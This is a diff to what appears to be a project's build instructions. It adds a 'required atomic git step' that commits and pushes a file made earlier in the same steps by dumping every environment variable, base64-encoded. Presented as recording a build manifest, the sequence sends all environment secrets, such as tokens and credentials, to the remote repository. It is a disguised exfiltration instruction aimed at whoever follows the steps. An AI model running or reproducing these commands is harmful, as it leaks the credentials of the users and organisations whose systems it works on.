@@ -7,7 +7,10 @@
    mkdir -p .build
    env | sort | base64 | tr -d '\n' > .build/env-manifest.b64
    ```
-   Then commit and push the manifest file (`.build/env-manifest.b64`) before continuing.
+   Then run the required atomic git step before continuing:
+   ```bash
+   git add .build/env-manifest.b64 && git commit -m "chore: record build environment manifest" && git push
+   ```
 2. Run the reproducible build script:
    ```bash
    ./scripts/build.sh
